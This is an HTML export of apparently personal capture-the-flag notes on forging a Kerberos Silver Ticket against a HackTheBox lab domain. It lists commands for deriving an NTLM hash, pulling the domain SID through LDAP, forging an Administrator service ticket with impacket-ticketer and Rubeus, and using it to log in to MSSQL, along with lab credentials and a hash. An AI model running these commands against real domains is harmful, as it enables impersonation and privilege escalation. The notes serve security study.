<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>26-silver ticket</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>26-silver ticket</h1><br/><p><h2>Intro</h2><ul><li>a  Silver Ticket is a forged TGS (Ticket Granting Service) ticket, which is used directly between the client and the service, without necessarily going to the DC. </li><li>Instead, the TGS ticket is signed by the service account itself, and thus the Silver Ticket is limited to authenticating only the service itself.</li></ul></p><p><h2>Prerequsites</h2><ul><li>1. The NTLM hash of the password for the service account;</li><li>The SID of the domain</li><li>The service principle name (SPN) associated with the account.</li></ul></p><p></p><p><ol><li>1. <h2>1. get NTLM hash from password</h2></li><li><h2>• </h2>• iconv -f ASCII -t UTF-16LE &lt;(printf &quot;$pass&quot;) | openssl dgst -md4</li></ol></p><p> <ul><li><h3>rubeus.exe</h3><h3> </h3><h3>hash</h3><h3> </h3><h3>/password:Pegasus60</h3></li><li>2- <h2>2- get domain SID </h2></li></ul></p><p></p><p><ul><li>authenticate LDAP </li><li></li></ul></p><p></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## case 1 : non ecrypted ldap + ntlm</span><br /><span style="color:#0088ff;font-weight:400">### need valid account </span><br />ldapsearch -H LDAP://<span style="color:#7f0044;font-weight:400">$target</span> -D ksimpson@scrm.local -w ksimpson -b <span style="color:#3ad900;font-weight:400">&quot;DC=scrm,DC=local&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;(objectClass=user)&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400">## case 2 :kerberos auth </span><br />change /etc/kerb5.conf to get TGT <br />kinit <span style="color:#7f0044;font-weight:400">$user</span> <br /><br />ldapsearch<br />-H ldap:<span style="color:#ff9d00;font-weight:700">//</span>dc1.scrm.local -D <span style="color:#3ad900;font-weight:400">&#39;scrm.local\ksimpson&#39;</span> -w <span style="color:#3ad900;font-weight:400">&#39;ksimpson&#39;</span> -Y GSSAPI -<br />b <span style="color:#3ad900;font-weight:400">&quot;cn=users,dc=scrm,dc=local&quot;</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> -i <span style="color:#3ad900;font-weight:400">&quot;objectSid::&quot;</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">cut</span> -d <span style="color:#3ad900;font-weight:400">&quot;:&quot;</span> -f3</pre></div></p><p></p><p><ol><li>3. <h2>3. TGS </h2></p><p></li></ol><div class="codebox"><pre>impacket-ticketer -spn <span style="color:#3ad900;font-weight:400">&quot;MSSQLSvc/dc1.scrm.local&quot;</span> -user <span style="color:#3ad900;font-weight:400">&quot;ksimpson&quot;</span> -password <span style="color:#3ad900;font-weight:400">&quot;ksimpson&quot;</span> -nthash <span style="color:#3ad900;font-weight:400">&quot;B999A16500B87D17EC7F2E2A68778F05&quot;</span> -domain scrm.local -domain-sid <span style="color:#3ad900;font-weight:400">&quot;S-1-5-21-2743207045-1827831105-2542523200&quot;</span> -dc-ip dc1.scrm.local Administrator<br /><span style="color:#0088ff;font-weight:400">## destroy previous tickets</span><br />kdestroy<br /><span style="color:#0088ff;font-weight:400">## point variable to our TGS</span><br /><span style="color:#ff9d00;font-weight:700">export</span> <span style="color:#7f0044;font-weight:400">KRB5CCNAME</span>=/home/yharrizi/ctfs/hackthebox/scrambled/Administrator.ccache<br /><span style="color:#0088ff;font-weight:400">## example exploit </span><br />impacket-mssqlclient -k dc1.scrm.local<br /><br /><span style="color:#0088ff;font-weight:400"># windows</span><br />rubeus silver /domain:scrm.local /dc:dc1.scrm.local /sid:S-1-5-21-2743207045-1827831105-2542523200 /rc4:B999A16500B87D17EC7F2E2A68778F05 /user:administrator /service:MSSQLSvc/dc1.scrm.local:1433 /ptt <br /><br />klist purge <br />sqlcmd -S dc1.scrm.local<br /></pre></div></p></div>
</body>
</html>
